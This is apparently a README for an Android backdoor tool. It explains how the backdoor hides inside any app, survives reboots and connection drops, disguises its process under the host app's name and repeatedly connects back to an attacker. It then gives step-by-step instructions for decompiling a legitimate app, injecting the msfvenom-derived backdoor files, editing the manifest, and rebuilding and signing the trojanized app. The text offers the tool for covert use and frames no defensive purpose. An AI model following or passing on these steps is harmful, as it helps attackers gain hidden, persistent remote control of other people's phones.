# Advanced Android Hidden Backdoor

This type of backdoor is different from any other, due to the fact that it goes beyond the limitations of all the techniques commonly used in this context. It can be hidden in any other application and it is resistant to reboot or connectivity drop (thanks to Giovanni Colonna code, link below).
In order to do that, the activity of the backdoor is no more related with the starting of the hosting app.
**The backdoor here is invoked by two events:**

* The phone has been switched on or rebooted.
* There has been a connectivity change

In this two cases, the connectivity is checked:
* if the phone is connected, the backdoor tries to instantiate the connection with the attacker and launches a background service that retry every X minutes. (Preconfigured at 30 minutes)
* if it is disconnected and the service has been launched, the backdoor's background service is killed.

**The service will show in the list of all processes with the name of the app you insert the code in.**


# HOW TO
```
Modify attacker's host and port in the /app/src/main/java/livingbox/Connect.java(String URL line), decompile the app we want to insert the code, 
copy all the files in /app/src/main/java/livingbox/ to the original app decompiled folder, in /smali/livingbox (new folder).
After all, modify the original AndroidManifest adding the missing permission and the rest of the lines about service and receiver wrote in this project's AndroidManifest.
Rebuild the original app and sign it!
```

## Use it at your own risk
Tested on Nexus 5, Android 7.1.1

# Special thanks
The most of this code has been written by Giovanni Colonna.
He has modified the original app code generated by msfvenom making the backdoor connection more stable.
